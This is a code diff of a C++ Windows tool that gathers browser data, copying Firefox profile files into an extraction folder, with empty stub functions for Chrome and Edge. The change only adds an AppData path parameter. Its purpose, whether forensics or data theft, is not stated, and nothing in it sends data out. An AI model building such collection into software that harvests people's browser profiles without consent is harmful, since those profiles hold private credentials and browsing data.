@@ -19,8 +19,8 @@ namespace fs = std::filesystem;
 
 bool verify_browser_installation(const LPCWSTR p_name);
 void collect_firefox_data(std::string p_path_to_extraction_directory, std::string p_path_to_appdata);
-void collect_chrome_data(std::string p_path_to_extraction_directory);
-void collect_edge_data(std::string p_path_to_extraction_directory);
+void collect_chrome_data(std::string p_path_to_extraction_directory, std::string p_path_to_appdata);
+void collect_edge_data(std::string p_path_to_extraction_directory, std::string p_path_to_appdata);
 
 // Helper functions
 wchar_t* convert_to_wchar(const char* charArray);
@@ -48,7 +48,7 @@ int main(int argc, char** argv) {
 			convert_to_wchar((path_to_extraction_directory + "\\Chrome").c_str()),
 			NULL
 		);
-		collect_chrome_data(path_to_extraction_directory + "\\Chrome");
+		collect_chrome_data(path_to_extraction_directory + "\\Chrome", path_to_appdata);
 	}
 
 	// Edge
@@ -58,7 +58,7 @@ int main(int argc, char** argv) {
 			convert_to_wchar((path_to_extraction_directory + "\\Edge").c_str()),
 			NULL
 		);
-		collect_edge_data(path_to_extraction_directory + "\\Edge");
+		collect_edge_data(path_to_extraction_directory + "\\Edge", path_to_appdata);
 	}
 
 	return 0;
@@ -116,7 +116,6 @@ bool verify_browser_installation(const LPCWSTR p_name) {
 }
 
 void collect_firefox_data(std::string p_path_to_extraction_directory, std::string p_path_to_appdata) {
-	// std::string p_path_to_appdata = get_local_appdata_path();
 	if (p_path_to_extraction_directory != "" && p_path_to_appdata != "") {
 		std::string path_to_profiles = p_path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
 		std::vector<std::regex> regex_list = {
@@ -156,11 +155,11 @@ void collect_firefox_data(std::string p_path_to_extraction_directory, std::strin
 	}
 }
 
-void collect_chrome_data(std::string p_path_to_extraction_directory) {
+void collect_chrome_data(std::string p_path_to_extraction_directory, std::string p_path_to_appdata) {
 
 }
 
-void collect_edge_data(std::string p_path_to_extraction_directory) {
+void collect_edge_data(std::string p_path_to_extraction_directory, std::string p_path_to_appdata) {
 
 }
 
